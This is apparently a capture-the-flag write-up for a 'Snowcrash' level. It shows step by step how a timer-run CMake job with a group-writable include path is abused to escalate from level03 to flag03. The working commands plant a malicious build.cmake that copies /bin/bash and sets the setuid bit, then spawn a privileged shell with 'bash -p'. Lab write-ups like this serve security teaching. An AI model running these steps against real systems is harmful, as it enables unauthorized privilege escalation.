# Snowcrash Level03 — Simple Writeup

**Goal:** Go from user `level03` to user `flag03` by abusing a scheduled job that runs CMake.

---

## 1. Recon — find the target

```bash
find / -user flag03 2>/dev/null
```
```
/home/flag03
/etc/burbclave
/opt/snowcrash/level03/CMakeLists.txt
```

These are files owned by `flag03`. We can't log in as flag03 directly — so the plan is to find a **process that already runs as flag03**, and trick it into doing something for us.

```bash
id
```
```
uid=1004(level03) groups=1006(level03),988(burbclave),1001(levelgroup)
```

We're in group `burbclave`. That's the foothold — check what that group can touch:

```bash
ls -la /var/lib/burbclave/staging/
```
```
drwxrwxr-x  root burbclave   staging/
```

Group `burbclave` has **write access** to this folder. We can write here.

---

## 2. The vulnerable file

```bash
cat /opt/snowcrash/level03/CMakeLists.txt
```

Key lines:

```cmake
file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)
# ...extracts "runtime_base" and "workspace" from that file...
# ...glues them into RESOLVED_BUILD_PATH...
include(${RESOLVED_BUILD_PATH}/build.cmake)
```

**Why this matters:** `CMakeLists.txt` isn't a config file — it's a *program*. `include()` doesn't read data, it **executes** another file as more CMake code. And CMake has `execute_process()`, which runs real shell commands.

So: if we control which file gets `include()`-d, we get code execution — at whatever privilege level runs this CMakeLists.txt.

We can't read `/etc/burbclave/burbclave.conf` (permission denied), but the writable `staging/` folder we just found is a strong hint that `runtime_base`/`workspace` resolve to exactly that path. So: drop our own `build.cmake` there.

---

## 3. Find what runs it, and as whom

```bash
systemctl list-timers --all
```
→ `burbclave.timer` fires every ~60 seconds.

```bash
cat /etc/systemd/system/burbclave.service
```
```ini
User=flag03
ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
StandardError=null
```

This is the whole exploit in one line: **every 60 seconds, CMake runs this file as flag03.** Our writable staging folder + their `include()` = code execution as flag03.

---

## 4.  copy first, then setuid your own copy

**Key fact:** when you copy a file, the *copy* is owned by whoever created it — not by whoever owned the original.

**Step 1 — make a copy (owned by flag03):**
```bash
echo 'execute_process(COMMAND cp /bin/bash /tmp/flag03bash)' > /var/lib/burbclave/staging/build.cmake
# wait ~60s for the timer
ls -la /tmp/flag03bash   # now owned by flag03
```

**Step 2 — setuid the copy (works now, since flag03 owns it):**
```bash
echo 'execute_process(COMMAND chmod u+s /tmp/flag03bash)' > /var/lib/burbclave/staging/build.cmake
# wait ~60s again
ls -la /tmp/flag03bash   # permissions now show -rwsr-xr-x
```

---

## 5. Get the shell and the flag

```bash
/tmp/flag03bash -p
id
```

`-p` matters because bash *automatically drops* elevated privileges when its real and effective user differ, unless told not to (`-p` = "privileged, don't drop it").

```bash
cat /home/flag03/flag03.txt
```

---

## The logic in one paragraph

A scheduled job runs CMake **as flag03**. CMake's `include()` executes a file whose path is partly built from a config we can't read — but a writable folder we *can* reach, via group membership, is almost certainly that path. We drop a malicious `build.cmake` there. Our first idea (setuid `/bin/bash` directly) fails because only an owner can `chmod` a file. The fix: copy `/bin/bash` first (the copy is ours, since we created it), then setuid *that* copy. Now running the copy with `bash -p` gives a shell running as flag03.
